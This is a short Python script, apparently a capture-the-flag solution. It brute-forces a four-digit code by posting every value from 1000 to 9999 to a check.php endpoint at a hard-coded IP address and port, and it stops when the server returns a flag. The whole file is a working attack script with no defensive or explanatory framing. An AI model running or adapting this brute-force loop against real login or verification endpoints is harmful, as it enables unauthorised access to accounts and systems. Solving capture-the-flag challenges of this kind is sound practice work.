from requests import Session

session = Session()
session.get('http://139.162.5.230:10416/')

for i in range(1000, 10000):
    r = session.post('http://139.162.5.230:10416/check.php', data={'code': str(i)})
    try:
        json_data = r.json()
        print(f"Trying code {i}: ", json_data)
        if json_data.get('status') == 'success':
            print("Found flag:", json_data.get('flag'))
            break
    except Exception as e:
        print(f"Error decoding JSON for code {i}: {e}")
